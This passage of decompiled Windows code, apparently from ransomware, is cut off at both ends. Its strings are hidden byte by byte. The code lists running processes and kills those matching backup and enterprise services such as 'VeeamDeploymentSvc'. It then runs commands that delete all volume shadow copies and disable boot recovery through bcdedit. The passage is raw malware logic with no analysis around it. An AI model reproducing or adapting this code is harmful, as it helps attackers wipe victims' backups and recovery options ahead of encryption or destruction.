LOBYTE(v503) = *v503;\n        TickCount = v503;\n        v504 = sub_401010((char *)&STACK[0x199], v502++);\n        *v504 = sub_401120(&STACK[0x198], (char)TickCount);\n      }\n      while ( v502 < 8 );\n      *sub_401010((char *)&STACK[0x199], 8) = 0;\n      STACK[0x860] = (unsigned int)sub_401000(&STACK[0x199]);\n      LOBYTE(STACK[0x1CE]) = 25;\n      LOBYTE(STACK[0x1CF]) = sub_401120(&STACK[0x1CE], 67);\n      LOBYTE(STACK[0x1D0]) = sub_401120(&STACK[0x1CE], 97);\n      LOBYTE(STACK[0x1D1]) = sub_401120(&STACK[0x1CE], 103);\n      LOBYTE(STACK[0x1D2]) = sub_401120(&STACK[0x1CE], 83);\n      LOBYTE(STACK[0x1D3]) = sub_401120(&STACK[0x1CE], 101);\n      LOBYTE(STACK[0x1D4]) = sub_401120(&STACK[0x1CE], 114);\n      LOBYTE(STACK[0x1D5]) = sub_401120(&STACK[0x1CE], 118);\n      LOBYTE(STACK[0x1D6]) = sub_401120(&STACK[0x1CE], 105);\n      LOBYTE(STACK[0x1D7]) = sub_401120(&STACK[0x1CE], 99);\n      LOBYTE(STACK[0x1D8]) = sub_401120(&STACK[0x1CE], 101);\n      v505 = 0;\n      LOBYTE(STACK[0x1D9]) = 0;\n      do\n      {\n        v506 = sub_401010((char *)&STACK[0x1CF], v505);\n        LOBYTE(v506) = *v506;\n        TickCount = v506;\n        v507 = sub_401010((char *)&STACK[0x1CF], v505++);\n        *v507 = sub_401120(&STACK[0x1CE], (char)TickCount);\n      }\n      while ( v505 < 0xA );\n      *sub_401010((char *)&STACK[0x1CF], 10) = 0;\n      STACK[0x660] = (unsigned int)sub_401000(&STACK[0x1CF]);\n      LOBYTE(STACK[0x2DA]) = 43;\n      LOBYTE(STACK[0x2DB]) = sub_401120(&STACK[0x2DA], 68);\n      LOBYTE(STACK[0x2DC]) = sub_401120(&STACK[0x2DA], 101);\n      LOBYTE(STACK[0x2DD]) = sub_401120(&STACK[0x2DA], 108);\n      LOBYTE(STACK[0x2DE]) = sub_401120(&STACK[0x2DA], 108);\n      LOBYTE(STACK[0x2DF]) = sub_401120(&STACK[0x2DA], 83);\n      LOBYTE(STACK[0x2E0]) = sub_401120(&STACK[0x2DA], 121);\n      LOBYTE(STACK[0x2E1]) = sub_401120(&STACK[0x2DA], 115);\n      LOBYTE(STACK[0x2E2]) = sub_401120(&STACK[0x2DA], 116);\n      LOBYTE(STACK[0x2E3]) = sub_401120(&STACK[0x2DA], 101);\n      LOBYTE(STACK[0x2E4]) = sub_401120(&STACK[0x2DA], 109);\n      LOBYTE(STACK[0x2E5]) = sub_401120(&STACK[0x2DA], 68);\n      LOBYTE(STACK[0x2E6]) = sub_401120(&STACK[0x2DA], 101);\n      LOBYTE(STACK[0x2E7]) = sub_401120(&STACK[0x2DA], 116);\n      LOBYTE(STACK[0x2E8]) = sub_401120(&STACK[0x2DA], 101);\n      LOBYTE(STACK[0x2E9]) = sub_401120(&STACK[0x2DA], 99);\n      LOBYTE(STACK[0x2EA]) = sub_401120(&STACK[0x2DA], 116);\n      v508 = 0;\n      LOBYTE(STACK[0x2EB]) = 0;\n      do\n      {\n        v509 = sub_401010((char *)&STACK[0x2DB], v508);\n        LOBYTE(v509) = *v509;\n        TickCount = v509;\n        v510 = sub_401010((char *)&STACK[0x2DB], v508++);\n        *v510 = sub_401120(&STACK[0x2DA], (char)TickCount);\n      }\n      while ( v508 < 0x10 );\n      *sub_401010((char *)&STACK[0x2DB], 16) = 0;\n      lpProcName = (LPCSTR)sub_401000(&STACK[0x2DB]);\n      LOBYTE(STACK[0x2C8]) = 114;\n      LOBYTE(STACK[0x2C9]) = sub_401120(&STACK[0x2C8], 69);\n      LOBYTE(STACK[0x2CA]) = sub_401120(&STACK[0x2C8], 110);\n      LOBYTE(STACK[0x2CB]) = sub_401120(&STACK[0x2C8], 116);\n      LOBYTE(STACK[0x2CC]) = sub_401120(&STACK[0x2C8], 101);\n      LOBYTE(STACK[0x2CD]) = sub_401120(&STACK[0x2C8], 114);\n      LOBYTE(STACK[0x2CE]) = sub_401120(&STACK[0x2C8], 112);\n      LOBYTE(STACK[0x2CF]) = sub_401120(&STACK[0x2C8], 114);\n      LOBYTE(STACK[0x2D0]) = sub_401120(&STACK[0x2C8], 105);\n      LOBYTE(STACK[0x2D1]) = sub_401120(&STACK[0x2C8], 115);\n      LOBYTE(STACK[0x2D2]) = sub_401120(&STACK[0x2C8], 101);\n      LOBYTE(STACK[0x2D3]) = sub_401120(&STACK[0x2C8], 67);\n      LOBYTE(STACK[0x2D4]) = sub_401120(&STACK[0x2C8], 108);\n      LOBYTE(STACK[0x2D5]) = sub_401120(&STACK[0x2C8], 105);\n      LOBYTE(STACK[0x2D6]) = sub_401120(&STACK[0x2C8], 101);\n      LOBYTE(STACK[0x2D7]) = sub_401120(&STACK[0x2C8], 110);\n      LOBYTE(STACK[0x2D8]) = sub_401120(&STACK[0x2C8], 116);\n      v511 = 0;\n      LOBYTE(STACK[0x2D9]) = 0;\n      do\n      {\n        v512 = sub_401010((char *)&STACK[0x2C9], v511);\n        LOBYTE(v512) = *v512;\n        TickCount = v512;\n        v513 = sub_401010((char *)&STACK[0x2C9], v511++);\n        *v513 = sub_401120(&STACK[0x2C8], (char)TickCount);\n      }\n      while ( v511 < 0x10 );\n      *sub_401010((char *)&STACK[0x2C9], 16) = 0;\n      v581 = sub_401000(&STACK[0x2C9]);\n      LOBYTE(STACK[0x324]) = 11;\n      LOBYTE(STACK[0x325]) = sub_401120(&STACK[0x324], 86);\n      LOBYTE(STACK[0x326]) = sub_401120(&STACK[0x324], 101);\n      LOBYTE(STACK[0x327]) = sub_401120(&STACK[0x324], 101);\n      LOBYTE(STACK[0x328]) = sub_401120(&STACK[0x324], 97);\n      LOBYTE(STACK[0x329]) = sub_401120(&STACK[0x324], 109);\n      LOBYTE(STACK[0x32A]) = sub_401120(&STACK[0x324], 68);\n      LOBYTE(STACK[0x32B]) = sub_401120(&STACK[0x324], 101);\n      LOBYTE(STACK[0x32C]) = sub_401120(&STACK[0x324], 112);\n      LOBYTE(STACK[0x32D]) = sub_401120(&STACK[0x324], 108);\n      LOBYTE(STACK[0x32E]) = sub_401120(&STACK[0x324], 111);\n      LOBYTE(STACK[0x32F]) = sub_401120(&STACK[0x324], 121);\n      LOBYTE(STACK[0x330]) = sub_401120(&STACK[0x324], 109);\n      LOBYTE(STACK[0x331]) = sub_401120(&STACK[0x324], 101);\n      LOBYTE(STACK[0x332]) = sub_401120(&STACK[0x324], 110);\n      LOBYTE(STACK[0x333]) = sub_401120(&STACK[0x324], 116);\n      LOBYTE(STACK[0x334]) = sub_401120(&STACK[0x324], 83);\n      LOBYTE(STACK[0x335]) = sub_401120(&STACK[0x324], 118);\n      LOBYTE(STACK[0x336]) = sub_401120(&STACK[0x324], 99);\n      LOBYTE(STACK[0x337]) = 0;\n      for ( kk = 0; kk < 0x12; ++kk )\n      {\n        v515 = sub_401010((char *)&STACK[0x325], kk);\n        LOBYTE(v515) = *v515;\n        TickCount = v515;\n        v516 = sub_401010((char *)&STACK[0x325], kk);\n        *v516 = sub_401120(&STACK[0x324], (char)TickCount);\n      }\n      *sub_401010((char *)&STACK[0x325], 18) = 0;\n      STACK[0xDF0] = (unsigned int)&STACK[0x637];\n      STACK[0xDF4] = (unsigned int)&STACK[0x7BA];\n      STACK[0xDF8] = (unsigned int)&STACK[0x5C7];\n      STACK[0xDFC] = (unsigned int)&STACK[0x7E4];\n      STACK[0xE00] = (unsigned int)&STACK[0x709];\n      STACK[0xE04] = (unsigned int)&STACK[0x603];\n      STACK[0xE08] = (unsigned int)&STACK[0x5AC];\n      STACK[0xE0C] = (unsigned int)&STACK[0x641];\n      STACK[0xE10] = (unsigned int)&STACK[0x655];\n      STACK[0xE14] = (unsigned int)&STACK[0x5B5];\n      STACK[0xE18] = (unsigned int)&STACK[0x80E];\n      STACK[0xE1C] = (unsigned int)&STACK[0x5DF];\n      STACK[0xE20] = (unsigned int)&STACK[0x64B];\n      STACK[0xE24] = (unsigned int)&STACK[0xA09];\n      STACK[0xE28] = (unsigned int)&STACK[0x714];\n      STACK[0xE2C] = (unsigned int)&STACK[0x772];\n      STACK[0xE30] = (unsigned int)&STACK[0x7DD];\n      STACK[0xE34] = (unsigned int)&STACK[0x726];\n      STACK[0xE38] = STACK[0x628];\n      STACK[0xE3C] = (unsigned int)&STACK[0x5BE];\n      STACK[0xE40] = STACK[0xAF4];\n      STACK[0xE44] = STACK[0xAF0];\n      STACK[0xE48] = STACK[0xAEC];\n      STACK[0xE4C] = STACK[0xAE8];\n      STACK[0xE50] = STACK[0xAE4];\n      STACK[0xE54] = STACK[0xAE0];\n      STACK[0xE58] = STACK[0xB90];\n      STACK[0xE5C] = STACK[0xADC];\n      STACK[0xE60] = (unsigned int)&STACK[0x61E];\n      STACK[0xE64] = STACK[0xAD8];\n      STACK[0xE68] = STACK[0xAD4];\n      STACK[0xE6C] = STACK[0xAD0];\n      STACK[0xE70] = STACK[0xACC];\n      STACK[0xE74] = STACK[0xAC8];\n      STACK[0xE78] = STACK[0xAC4];\n      STACK[0xE7C] = STACK[0xAC0];\n      STACK[0xE80] = STACK[0xABC];\n      STACK[0xE84] = STACK[0xAB8];\n      STACK[0xE88] = STACK[0xAB4];\n      STACK[0xE8C] = STACK[0xAB0];\n      STACK[0xE90] = STACK[0xB1C];\n      STACK[0xE94] = STACK[0xB18];\n      STACK[0xE98] = STACK[0xC10];\n      STACK[0xE9C] = STACK[0xC0C];\n      STACK[0xEA0] = STACK[0xC08];\n      STACK[0xEA4] = STACK[0xC04];\n      STACK[0xEA8] = STACK[0xC00];\n      STACK[0xEAC] = STACK[0xBFC];\n      STACK[0xEB0] = STACK[0xBF8];\n      STACK[0xEB4] = (unsigned int)&STACK[0x71F];\n      STACK[0xEB8] = STACK[0xBB0];\n      STACK[0xEBC] = STACK[0xBF4];\n      STACK[0xEC0] = STACK[0xBF0];\n      STACK[0xEC4] = STACK[0xBEC];\n      STACK[0xEC8] = STACK[0xBE8];\n      STACK[0xECC] = STACK[0xBE4];\n      STACK[0xED0] = STACK[0xBE0];\n      STACK[0xED4] = STACK[0xBDC];\n      STACK[0xED8] = STACK[0xBD8];\n      STACK[0xEDC] = STACK[0xBD4];\n      STACK[0xEE0] = STACK[0xBD0];\n      STACK[0xEE4] = (unsigned int)&STACK[0x5D1];\n      STACK[0xEE8] = STACK[0xBCC];\n      STACK[0xEEC] = STACK[0xBC8];\n      STACK[0xEF0] = STACK[0xBC4];\n      STACK[0xEF4] = STACK[0xBC0];\n      STACK[0xEF8] = STACK[0xBBC];\n      STACK[0xEFC] = STACK[0xBB8];\n      STACK[0xF00] = STACK[0xBB4];\n      STACK[0xF04] = STACK[0xBAC];\n      STACK[0xF08] = STACK[0xBA8];\n      STACK[0xF0C] = STACK[0xBA4];\n      STACK[0xF10] = STACK[0xBA0];\n      STACK[0xF14] = STACK[0xB9C];\n      STACK[0xF18] = STACK[0xB98];\n      STACK[0xF1C] = STACK[0xB94];\n      STACK[0xF20] = STACK[0xB3C];\n      STACK[0xF24] = STACK[0xB38];\n      STACK[0xF28] = STACK[0xB34];\n      STACK[0xF2C] = STACK[0xB30];\n      STACK[0xF30] = STACK[0xB2C];\n      STACK[0xF34] = STACK[0xB28];\n      STACK[0xF38] = STACK[0xB24];\n      STACK[0xF3C] = STACK[0xB20];\n      STACK[0xF40] = STACK[0xB14];\n      STACK[0xF44] = STACK[0xB10];\n      STACK[0xF48] = STACK[0xB0C];\n      STACK[0xF4C] = STACK[0xB08];\n      STACK[0xF50] = STACK[0xB04];\n      STACK[0xF54] = (unsigned int)&STACK[0x5B5];\n      STACK[0xF58] = STACK[0xB00];\n      STACK[0xF5C] = STACK[0xAFC];\n      STACK[0xF60] = STACK[0xAF8];\n      STACK[0xF64] = STACK[0x864];\n      STACK[0xF68] = STACK[0x850];\n      STACK[0xF6C] = STACK[0x858];\n      STACK[0xF70] = STACK[0x854];\n      STACK[0xF74] = STACK[0x85C];\n      STACK[0xF78] = STACK[0x860];\n      STACK[0xF7C] = STACK[0x660];\n      STACK[0xF80] = (unsigned int)lpProcName;\n      STACK[0xF84] = (unsigned int)v581;\n      STACK[0xF88] = (unsigned int)&STACK[0x765];\n      STACK[0xF8C] = (unsigned int)&STACK[0xA5F];\n      STACK[0xF90] = (unsigned int)sub_401000(&STACK[0x325]);\n      STACK[0xF94] = 0;\n      sub_40CC00(&STACK[0x1104], 0, 0x124u);\n      STACK[0x1100] = 296;\n      Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);\n      STACK[0x660] = (unsigned int)Toolhelp32Snapshot;\n      Process32First(Toolhelp32Snapshot, (LPPROCESSENTRY32)&STACK[0x1100]);\n      while ( 1 )\n      {\n        v518 = sub_40CD50(&STACK[0x1124]);\n        sub_40CBE0(&STACK[0x1228], &STACK[0x1124], v518 + 1);\n        PathRemoveExtensionA((LPSTR)&STACK[0x1228]);\n        v519 = 0;\n        TickCount = 0;\n        do\n        {\n          lpProcName = (LPCSTR)(4 * (_DWORD)v519);\n          if ( !lstrcmpiA((LPCSTR)&STACK[0x1228], (LPCSTR)*(&STACK[0xDF0] + (_DWORD)v519)) && sub_41A160(STACK[0x1108]) )\n          {\n            LOBYTE(STACK[0x40F]) = 55;\n            LOBYTE(STACK[0x410]) = sub_401120(&STACK[0x40F], 75);\n            LOBYTE(STACK[0x411]) = sub_401120(&STACK[0x40F], 105);\n            LOBYTE(STACK[0x412]) = sub_401120(&STACK[0x40F], 108);\n            LOBYTE(STACK[0x413]) = sub_401120(&STACK[0x40F], 108);\n            LOBYTE(STACK[0x414]) = sub_401120(&STACK[0x40F], 101);\n            LOBYTE(STACK[0x415]) = sub_401120(&STACK[0x40F], 100);\n            LOBYTE(STACK[0x416]) = sub_401120(&STACK[0x40F], 32);\n            LOBYTE(STACK[0x417]) = sub_401120(&STACK[0x40F], 112);\n            LOBYTE(STACK[0x418]) = sub_401120(&STACK[0x40F], 114);\n            LOBYTE(STACK[0x419]) = sub_401120(&STACK[0x40F], 111);\n            LOBYTE(STACK[0x41A]) = sub_401120(&STACK[0x40F], 99);\n            LOBYTE(STACK[0x41B]) = sub_401120(&STACK[0x40F], 101);\n            LOBYTE(STACK[0x41C]) = sub_401120(&STACK[0x40F], 115);\n            LOBYTE(STACK[0x41D]) = sub_401120(&STACK[0x40F], 115);\n            LOBYTE(STACK[0x41E]) = sub_401120(&STACK[0x40F], 58);\n            LOBYTE(STACK[0x41F]) = sub_401120(&STACK[0x40F], 32);\n            LOBYTE(STACK[0x420]) = sub_401120(&STACK[0x40F], 37);\n            LOBYTE(STACK[0x421]) = sub_401120(&STACK[0x40F], 115);\n            LOBYTE(STACK[0x422]) = sub_401120(&STACK[0x40F], 32);\n            LOBYTE(STACK[0x423]) = sub_401120(&STACK[0x40F], 91);\n            LOBYTE(STACK[0x424]) = sub_401120(&STACK[0x40F], 112);\n            LOBYTE(STACK[0x425]) = sub_401120(&STACK[0x40F], 105);\n            LOBYTE(STACK[0x426]) = sub_401120(&STACK[0x40F], 100);\n            LOBYTE(STACK[0x427]) = sub_401120(&STACK[0x40F], 58);\n            LOBYTE(STACK[0x428]) = sub_401120(&STACK[0x40F], 32);\n            LOBYTE(STACK[0x429]) = sub_401120(&STACK[0x40F], 37);\n            LOBYTE(STACK[0x42A]) = sub_401120(&STACK[0x40F], 108);\n            LOBYTE(STACK[0x42B]) = sub_401120(&STACK[0x40F], 100);\n            LOBYTE(STACK[0x42C]) = sub_401120(&STACK[0x40F], 93);\n            v520 = 0;\n            LOBYTE(STACK[0x42D]) = 0;\n            do\n            {\n              v582 = *sub_401010((char *)&STACK[0x410], v520);\n              v521 = sub_401010((char *)&STACK[0x410], v520++);\n              *v521 = sub_401120(&STACK[0x40F], v582);\n            }\n            while ( v520 < 0x1D );\n            *sub_401010((char *)&STACK[0x410], 29) = 0;\n            v522 = (const CHAR *)sub_401000(&STACK[0x410]);\n            sub_40A0B0(v522, &STACK[0x1124], STACK[0x1108]);\n          }\n          v519 = ++TickCount;\n        }\n        while ( *(unsigned int *)((char *)&STACK[0xDF4] + (_DWORD)lpProcName) );\n        v523 = (void *)STACK[0x660];\n        if ( !Process32Next((HANDLE)STACK[0x660], (LPPROCESSENTRY32)&STACK[0x1100]) )\n        {\n          v524 = CloseHandle(v523);\n          STACK[0x86C] = 0;\n          LOWORD(v524) = __GS__;\n          if ( v524 )\n          {\n            LOBYTE(STACK[0x44D]) = 64;\n            LOBYTE(STACK[0x44E]) = sub_401120(&STACK[0x44D], 87);\n            LOBYTE(STACK[0x44F]) = sub_401120(&STACK[0x44D], 111);\n            LOBYTE(STACK[0x450]) = sub_401120(&STACK[0x44D], 119);\n            LOBYTE(STACK[0x451]) = sub_401120(&STACK[0x44D], 54);\n            LOBYTE(STACK[0x452]) = sub_401120(&STACK[0x44D], 52);\n            LOBYTE(STACK[0x453]) = sub_401120(&STACK[0x44D], 68);\n            LOBYTE(STACK[0x454]) = sub_401120(&STACK[0x44D], 105);\n            LOBYTE(STACK[0x455]) = sub_401120(&STACK[0x44D], 115);\n            LOBYTE(STACK[0x456]) = sub_401120(&STACK[0x44D], 97);\n            LOBYTE(STACK[0x457]) = sub_401120(&STACK[0x44D], 98);\n            LOBYTE(STACK[0x458]) = sub_401120(&STACK[0x44D], 108);\n            LOBYTE(STACK[0x459]) = sub_401120(&STACK[0x44D], 101);\n            LOBYTE(STACK[0x45A]) = sub_401120(&STACK[0x44D], 87);\n            LOBYTE(STACK[0x45B]) = sub_401120(&STACK[0x44D], 111);\n            LOBYTE(STACK[0x45C]) = sub_401120(&STACK[0x44D], 119);\n            LOBYTE(STACK[0x45D]) = sub_401120(&STACK[0x44D], 54);\n            LOBYTE(STACK[0x45E]) = sub_401120(&STACK[0x44D], 52);\n            LOBYTE(STACK[0x45F]) = sub_401120(&STACK[0x44D], 70);\n            LOBYTE(STACK[0x460]) = sub_401120(&STACK[0x44D], 115);\n            LOBYTE(STACK[0x461]) = sub_401120(&STACK[0x44D], 82);\n            LOBYTE(STACK[0x462]) = sub_401120(&STACK[0x44D], 101);\n            LOBYTE(STACK[0x463]) = sub_401120(&STACK[0x44D], 100);\n            LOBYTE(STACK[0x464]) = sub_401120(&STACK[0x44D], 105);\n            LOBYTE(STACK[0x465]) = sub_401120(&STACK[0x44D], 114);\n            LOBYTE(STACK[0x466]) = sub_401120(&STACK[0x44D], 101);\n            LOBYTE(STACK[0x467]) = sub_401120(&STACK[0x44D], 99);\n            LOBYTE(STACK[0x468]) = sub_401120(&STACK[0x44D], 116);\n            LOBYTE(STACK[0x469]) = sub_401120(&STACK[0x44D], 105);\n            LOBYTE(STACK[0x46A]) = sub_401120(&STACK[0x44D], 111);\n            LOBYTE(STACK[0x46B]) = sub_401120(&STACK[0x44D], 110);\n            v525 = 0;\n            LOBYTE(STACK[0x46C]) = 0;\n            do\n            {\n              v583 = *sub_401010((char *)&STACK[0x44E], v525);\n              v526 = sub_401010((char *)&STACK[0x44E], v525++);\n              *v526 = sub_401120(&STACK[0x44D], v583);\n            }\n            while ( v525 < 0x1E );\n            *sub_401010((char *)&STACK[0x44E], 30) = 0;\n            lpProcName = (LPCSTR)sub_401000(&STACK[0x44E]);\n            LOBYTE(STACK[0x18E]) = 26;\n            LOBYTE(STACK[0x18F]) = sub_401120(&STACK[0x18E], 107);\n            LOBYTE(STACK[0x190]) = sub_401120(&STACK[0x18E], 101);\n            LOBYTE(STACK[0x191]) = sub_401120(&STACK[0x18E], 114);\n            LOBYTE(STACK[0x192]) = sub_401120(&STACK[0x18E], 110);\n            LOBYTE(STACK[0x193]) = sub_401120(&STACK[0x18E], 101);\n            LOBYTE(STACK[0x194]) = sub_401120(&STACK[0x18E], 108);\n            LOBYTE(STACK[0x195]) = sub_401120(&STACK[0x18E], 51);\n            LOBYTE(STACK[0x196]) = sub_401120(&STACK[0x18E], 50);\n            v527 = 0;\n            LOBYTE(STACK[0x197]) = 0;\n            do\n            {\n              v584 = *sub_401010((char *)&STACK[0x18F], v527);\n              v528 = sub_401010((char *)&STACK[0x18F], v527++);\n              *v528 = sub_401120(&STACK[0x18E], v584);\n            }\n            while ( v527 < 8 );\n            *sub_401010((char *)&STACK[0x18F], 8) = 0;\n            v529 = (const CHAR *)sub_401000(&STACK[0x18F]);\n            v570 = lpProcName;\n            ModuleHandleA = GetModuleHandleA(v529);\n            ProcAddress = GetProcAddress(ModuleHandleA, v570);\n            if ( ProcAddress )\n              ((void (__stdcall *)(unsigned int *))ProcAddress)(&STACK[0x86C]);\n          }\n          STACK[0xFAC] = 60;\n          STACK[0xFB8] = (unsigned int)&STACK[0x7D6];\n          STACK[0xFBC] = (unsigned int)&STACK[0x5A3];\n          STACK[0xFC0] = (unsigned int)&STACK[0x1038];\n          STACK[0xFB0] = 0;\n          STACK[0xFB4] = 0;\n          STACK[0xFC4] = 0;\n          STACK[0xFC8] = 0;\n          STACK[0xFCC] = 0;\n          ShellExecuteExA((SHELLEXECUTEINFOA *)&STACK[0xFAC]);\n          sub_40CD60(0x3E8u);\n          LOBYTE(STACK[0x4DB]) = 57;\n          LOBYTE(STACK[0x4DC]) = sub_401120(&STACK[0x4DB], 47);\n          LOBYTE(STACK[0x4DD]) = sub_401120(&STACK[0x4DB], 99);\n          LOBYTE(STACK[0x4DE]) = sub_401120(&STACK[0x4DB], 32);\n          LOBYTE(STACK[0x4DF]) = sub_401120(&STACK[0x4DB], 118);\n          LOBYTE(STACK[0x4E0]) = sub_401120(&STACK[0x4DB], 115);\n          LOBYTE(STACK[0x4E1]) = sub_401120(&STACK[0x4DB], 115);\n          LOBYTE(STACK[0x4E2]) = sub_401120(&STACK[0x4DB], 97);\n          LOBYTE(STACK[0x4E3]) = sub_401120(&STACK[0x4DB], 100);\n          LOBYTE(STACK[0x4E4]) = sub_401120(&STACK[0x4DB], 109);\n          LOBYTE(STACK[0x4E5]) = sub_401120(&STACK[0x4DB], 105);\n          LOBYTE(STACK[0x4E6]) = sub_401120(&STACK[0x4DB], 110);\n          LOBYTE(STACK[0x4E7]) = sub_401120(&STACK[0x4DB], 32);\n          LOBYTE(STACK[0x4E8]) = sub_401120(&STACK[0x4DB], 68);\n          LOBYTE(STACK[0x4E9]) = sub_401120(&STACK[0x4DB], 101);\n          LOBYTE(STACK[0x4EA]) = sub_401120(&STACK[0x4DB], 108);\n          LOBYTE(STACK[0x4EB]) = sub_401120(&STACK[0x4DB], 101);\n          LOBYTE(STACK[0x4EC]) = sub_401120(&STACK[0x4DB], 116);\n          LOBYTE(STACK[0x4ED]) = sub_401120(&STACK[0x4DB], 101);\n          LOBYTE(STACK[0x4EE]) = sub_401120(&STACK[0x4DB], 32);\n          LOBYTE(STACK[0x4EF]) = sub_401120(&STACK[0x4DB], 83);\n          LOBYTE(STACK[0x4F0]) = sub_401120(&STACK[0x4DB], 104);\n          LOBYTE(STACK[0x4F1]) = sub_401120(&STACK[0x4DB], 97);\n          LOBYTE(STACK[0x4F2]) = sub_401120(&STACK[0x4DB], 100);\n          LOBYTE(STACK[0x4F3]) = sub_401120(&STACK[0x4DB], 111);\n          LOBYTE(STACK[0x4F4]) = sub_401120(&STACK[0x4DB], 119);\n          LOBYTE(STACK[0x4F5]) = sub_401120(&STACK[0x4DB], 115);\n          LOBYTE(STACK[0x4F6]) = sub_401120(&STACK[0x4DB], 32);\n          LOBYTE(STACK[0x4F7]) = sub_401120(&STACK[0x4DB], 47);\n          LOBYTE(STACK[0x4F8]) = sub_401120(&STACK[0x4DB], 65);\n          LOBYTE(STACK[0x4F9]) = sub_401120(&STACK[0x4DB], 108);\n          LOBYTE(STACK[0x4FA]) = sub_401120(&STACK[0x4DB], 108);\n          LOBYTE(STACK[0x4FB]) = sub_401120(&STACK[0x4DB], 32);\n          LOBYTE(STACK[0x4FC]) = sub_401120(&STACK[0x4DB], 47);\n          LOBYTE(STACK[0x4FD]) = sub_401120(&STACK[0x4DB], 81);\n          LOBYTE(STACK[0x4FE]) = sub_401120(&STACK[0x4DB], 117);\n          LOBYTE(STACK[0x4FF]) = sub_401120(&STACK[0x4DB], 105);\n          LOBYTE(STACK[0x500]) = sub_401120(&STACK[0x4DB], 101);\n          LOBYTE(STACK[0x501]) = sub_401120(&STACK[0x4DB], 116);\n          v532 = 0;\n          LOBYTE(STACK[0x502]) = 0;\n          do\n          {\n            v585 = *sub_401010((char *)&STACK[0x4DC], v532);\n            v533 = sub_401010((char *)&STACK[0x4DC], v532++);\n            *v533 = sub_401120(&STACK[0x4DB], v585);\n          }\n          while ( v532 < 0x26 );\n          *sub_401010((char *)&STACK[0x4DC], 38) = 0;\n          lpProcName = (LPCSTR)sub_401000(&STACK[0x4DC]);\n          LOBYTE(STACK[0x503]) = 109;\n          LOBYTE(STACK[0x504]) = sub_401120(&STACK[0x503], 47);\n          LOBYTE(STACK[0x505]) = sub_401120(&STACK[0x503], 99);\n          LOBYTE(STACK[0x506]) = sub_401120(&STACK[0x503], 32);\n          LOBYTE(STACK[0x507]) = sub_401120(&STACK[0x503], 98);\n          LOBYTE(STACK[0x508]) = sub_401120(&STACK[0x503], 99);\n          LOBYTE(STACK[0x509]) = sub_401120(&STACK[0x503], 100);\n          LOBYTE(STACK[0x50A]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x50B]) = sub_401120(&STACK[0x503], 100);\n          LOBYTE(STACK[0x50C]) = sub_401120(&STACK[0x503], 105);\n          LOBYTE(STACK[0x50D]) = sub_401120(&STACK[0x503], 116);\n          LOBYTE(STACK[0x50E]) = sub_401120(&STACK[0x503], 32);\n          LOBYTE(STACK[0x50F]) = sub_401120(&STACK[0x503], 47);\n          LOBYTE(STACK[0x510]) = sub_401120(&STACK[0x503], 115);\n          LOBYTE(STACK[0x511]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x512]) = sub_401120(&STACK[0x503], 116);\n          LOBYTE(STACK[0x513]) = sub_401120(&STACK[0x503], 32);\n          LOBYTE(STACK[0x514]) = sub_401120(&STACK[0x503], 123);\n          LOBYTE(STACK[0x515]) = sub_401120(&STACK[0x503], 100);\n          LOBYTE(STACK[0x516]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x517]) = sub_401120(&STACK[0x503], 102);\n          LOBYTE(STACK[0x518]) = sub_401120(&STACK[0x503], 97);\n          LOBYTE(STACK[0x519]) = sub_401120(&STACK[0x503], 117);\n          LOBYTE(STACK[0x51A]) = sub_401120(&STACK[0x503], 108);\n          LOBYTE(STACK[0x51B]) = sub_401120(&STACK[0x503], 116);\n          LOBYTE(STACK[0x51C]) = sub_401120(&STACK[0x503], 125);\n          LOBYTE(STACK[0x51D]) = sub_401120(&STACK[0x503], 32);\n          LOBYTE(STACK[0x51E]) = sub_401120(&STACK[0x503], 114);\n          LOBYTE(STACK[0x51F]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x520]) = sub_401120(&STACK[0x503], 99);\n          LOBYTE(STACK[0x521]) = sub_401120(&STACK[0x503], 111);\n          LOBYTE(STACK[0x522]) = sub_401120(&STACK[0x503], 118);\n          LOBYTE(STACK[0x523]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x524]) = sub_401120(&STACK[0x503], 114);\n          LOBYTE(STACK[0x525]) = sub_401120(&STACK[0x503], 121);\n          LOBYTE(STACK[0x526]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x527]) = sub_401120(&STACK[0x503], 110);\n          LOBYTE(STACK[0x528]) = sub_401120(&STACK[0x503], 97);\n          LOBYTE(STACK[0x529]) = sub_401120(&STACK[0x503], 98);\n          LOBYTE(STACK[0x52A]) = sub_401120(&STACK[0x503], 108);\n          LOBYTE(STACK[0x52B]) = sub_401120(&STACK[0x503], 101);\n          LOBYTE(STACK[0x52C]) = sub_401120(&STACK[0x503], 100);\n          LOBYTE(STACK[0x52D]) = sub_401120(&STACK[0x503], 32);\n          LOBYTE(STACK[0x52E]) = sub_401120(&STACK[0x503], 78);\n          LOBYTE(STACK[0x52F]) = sub_401120(&STACK[0x503], 111);\n          v534 = 0;\n          LOBYTE(STACK[0x530]) = 0;\n          do\n          {\n            v586 = *sub_401010((char *)&STACK[0x504], v534);\n            v535 = sub_401010((char *)&STACK[0x504], v534++);\n            *v535 = sub_401120(&STACK[0x503], v586);\n          }\n          while ( v534 < 0x2C );\n          *sub_401010((char *)&STACK[0x504], 44) = 0;\n          STACK[0x660] = (unsigned int)sub_401000(&STACK[0x504]);\n          LOBYTE(STACK[0x564]) = 77;\n          LOBYTE(STACK[0x565]) = sub_401120(&STACK[0x564], 47);\n          LOBYTE(STACK[0x566]) = sub_401120(&STACK[0x564], 99);\n          LOBYTE(STACK[0x567]) = sub_401120(&STACK[0x564], 32);\n          LOBYTE(STACK[0x568]) = sub_401120(&STACK[0x564], 98);\n          LOBYTE(STACK[0x569]) = sub_401120(&STACK[0x564], 99);\n          LOBYTE(STACK[0x56A]) = sub_401120(&STACK[0x564], 100);\n          LOBYTE(STACK[0x56B]) = sub_401120(&STACK[0x564], 101);\n          LOBYTE(STACK[0x56C]) = sub_401120(&STACK[0x564], 100);\n          LOBYTE(STACK[0x56D]) = sub_401120(&STACK[0x564], 105);\n          LOBYTE(STACK[0x56E]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x56F]) = sub_401120(&STACK[0x564], 32);\n          LOBYTE(STACK[0x570]) = sub_401120(&STACK[0x564], 47);\n          LOBYTE(STACK[0x571]) = sub_401120(&STACK[0x564], 115);\n          LOBYTE(STACK[0x572]) = sub_401120(&STACK[0x564], 101);\n          